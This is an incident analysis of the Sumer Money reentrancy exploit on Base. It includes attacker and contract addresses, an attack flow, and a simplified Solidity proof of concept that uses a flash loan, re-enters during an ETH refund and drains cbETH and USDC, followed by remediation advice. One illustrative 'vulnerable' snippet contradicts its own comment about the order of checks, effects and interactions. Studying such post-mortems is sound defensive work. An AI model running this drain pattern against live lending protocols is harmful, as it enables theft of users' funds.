# Sumer Money — repayBorrowBehalf Reentrancy Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-04 |
| **Protocol** | Sumer Money |
| **Chain** | Base |
| **Loss** | ~$350,000 |
| **Attacker** | [0xbb344544](https://basescan.org/address/0xbb344544ad328b5492397e967fe81737855e7e77) |
| **Attack Contract** | [0x13d27a2d](https://basescan.org/address/0x13d27a2d66ea33a4bc581d5fefb0b2a8defe9fe7) |
| **Vulnerable Contract** | [0x23811c17](https://basescan.org/address/0x23811c17bac40500decd5fb92d4feb972ae1e607) |
| **sdrETH** | [0x7b5969bB](https://basescan.org/address/0x7b5969bB51fa3B002579D7ee41A454AC691716DC) |
| **sdrUSDC** | [0x142017b5](https://basescan.org/address/0x142017b52c99d3dFe55E49d79Df0bAF7F4478c0c) |
| **sdrcbETH** | [0x6345aF6d](https://basescan.org/address/0x6345aF6dA3EBd9DF468e37B473128Fd3079C4a4b) |
| **WETH** | [0x42000000](https://basescan.org/address/0x4200000000000000000000000000000000000006) |
| **USDC** | [0x833589fC](https://basescan.org/address/0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913) |
| **Root Cause** | When calling `repayBorrowBehalf{value: borrowAmount + 1}()`, the `receive()` fallback is reentered during the ETH refund process, executing additional borrow/repay cycles to drain cbETH and USDC reserves |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/SumerMoney_exp.sol) |

---

## 1. Vulnerability Overview

The `repayBorrowBehalf()` function in Sumer Money (a Compound fork) contains logic to refund excess ETH when overpaid. During this refund, the attacking contract's `receive()` fallback is triggered. The attacker deployed a Helper contract to exploit this reentrancy, performing additional borrow and repay cycles to drain cbETH and USDC.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: reentrancy possible during ETH refund in repayBorrowBehalf
contract CEther {
    function repayBorrowBehalf(address borrower) external payable {
        uint256 repayAmount = borrowAmount[borrower];
        require(msg.value >= repayAmount, "insufficient");

        // Process loan repayment
        borrowAmount[borrower] = 0;
        totalBorrows -= repayAmount;

        // Refund excess ETH ← reentrancy point!
        if (msg.value > repayAmount) {
            // CEI pattern violation: external call before state update
            (bool ok,) = msg.sender.call{value: msg.value - repayAmount}("");
            // ↑ msg.sender.receive() executes reentrancy
            require(ok);
        }
    }
}

// ✅ Safe code: ReentrancyGuard + CEI pattern
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

function repayBorrowBehalf(address borrower) external payable nonReentrant {
    uint256 repayAmount = borrowAmount[borrower];
    require(msg.value >= repayAmount, "insufficient");

    // Update state first (Effects)
    borrowAmount[borrower] = 0;
    totalBorrows -= repayAmount;
    uint256 excess = msg.value - repayAmount;

    // External call last (Interactions)
    if (excess > 0) {
        (bool ok,) = msg.sender.call{value: excess}("");
        require(ok);
    }
}
```

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: CEther.sol
  function repayBorrowBehalf(address borrower) external payable {
    uint256 received = msg.value;
    uint256 borrows = CEther(payable(this)).borrowBalanceCurrent(borrower);
    if (received > borrows) {  // ❌ Vulnerability
      // payable(msg.sender).transfer(received - borrows);
      (bool success, ) = msg.sender.call{value: received - borrows}('');
      require(success, 'Address: unable to send value, recipient may have reverted');
    }
    (uint256 err, ) = repayBorrowBehalfInternal(borrower, borrows);
    requireNoError(err, 'repayBorrowBehalf failed');
  }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Balancer flash loan: 150 WETH + 645,000 USDC
  │
  ├─→ [2] sdrETH.mint(150 WETH) → obtain sdrETH
  │
  ├─→ [3] Deploy Helper contract + transfer USDC
  │
  ├─→ [4] Helper: sdrUSDC.mint() + sdrETH.borrow()
  │
  ├─→ [5] Helper: repayBorrowBehalf{value: borrow + 1}()
  │         └─ Refund of 1 wei excess → Helper.receive() reentrancy
  │
  ├─→ [6] receive() reentrancy:
  │         ├─ sdrcbETH.borrow() additional borrow
  │         └─ sdrUSDC.borrow() additional borrow
  │
  ├─→ [7] Withdraw sdrcbETH + sdrUSDC balances
  │
  ├─→ [8] Repay Balancer flash loan
  │
  └─→ [9] ~$350K cbETH + USDC drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface ICErc20 {
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function repayBorrowBehalf(address borrower) external payable returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function exchangeRateCurrent() external returns (uint256);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
}

contract Helper {
    ICErc20 constant sdrETH  = ICErc20(0x7b5969bB51fa3B002579D7ee41A454AC691716DC);
    ICErc20 constant sdrUSDC = ICErc20(0x142017b52c99d3dFe55E49d79Df0bAF7F4478c0c);
    ICErc20 constant sdrcbETH = ICErc20(0x6345aF6dA3EBd9DF468e37B473128Fd3079C4a4b);
    address attacker;

    constructor(address _attacker) { attacker = _attacker; }

    function setup(uint256 usdcAmount) external {
        // mint sdrUSDC collateral + borrow sdrETH
        IERC20(usdc).approve(address(sdrUSDC), usdcAmount);
        sdrUSDC.mint(usdcAmount);
        sdrETH.borrow(borrowEthAmount);

        // repayBorrowBehalf with 1 wei excess → receive() reentrancy
        sdrETH.repayBorrowBehalf{value: borrowEthAmount + 1}(address(this));
    }

    // Reentrancy entry point: called when repayBorrowBehalf refunds 1 wei
    receive() external payable {
        // Reenter to take additional borrows
        sdrcbETH.borrow(cbEthAmount);
        sdrUSDC.borrow(usdcBorrowAmount);
        // Transfer drained assets to attacker
        IERC20(cbETH).transfer(attacker, cbEthAmount);
        IERC20(usdc).transfer(attacker, usdcBorrowAmount);
    }
}

contract AttackContract {
    IBalancerVault constant balancer = IBalancerVault(/* Balancer Vault */);

    function testExploit() external {
        address[] memory tokens = new address[](2);
        uint256[] memory amounts = new uint256[](2);
        tokens[0] = weth; tokens[1] = usdc;
        amounts[0] = 150e18; amounts[1] = 645_000e6;
        balancer.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(address[] memory, uint256[] memory amounts, uint256[] memory fees, bytes memory) external {
        // mint sdrETH
        IERC20(weth).approve(address(sdrETH), amounts[0]);
        sdrETH.mint(amounts[0]);

        // Deploy Helper + execute reentrancy attack
        Helper helper = new Helper(address(this));
        IERC20(usdc).transfer(address(helper), amounts[1]);
        helper.setup(amounts[1]);

        // Repay Balancer
        IERC20(weth).transfer(address(balancer), amounts[0] + fees[0]);
        IERC20(usdc).transfer(address(balancer), amounts[1] + fees[1]);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Reentrancy (ETH refund path) |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow (CEI pattern violation) |
| **Attack Vector** | External (repayBorrowBehalf reentrancy) |
| **DApp Category** | Compound fork lending protocol (Base) |
| **Impact** | cbETH + USDC reserves drained (~$350K) |

## 6. Remediation Recommendations

1. **Apply ReentrancyGuard**: Add `nonReentrant` modifier to `repayBorrowBehalf`
2. **Follow CEI Pattern**: Return ETH only after all state updates are complete (Interactions last)
3. **Use Pull Pattern**: Replace immediate ETH transfer with a withdrawal pattern
4. **Review Compound Forks**: Verify that all upstream Compound security patches have been applied

## 7. Lessons Learned

- Compound forks may not incorporate all upstream security patches, requiring each fix to be independently verified.
- ETH over-refund logic involves external calls and is therefore a potential reentrancy vector.
- Even on newly launched protocols on Base chain, the reentrancy pattern known since the 2016 DAO hack continues to recur.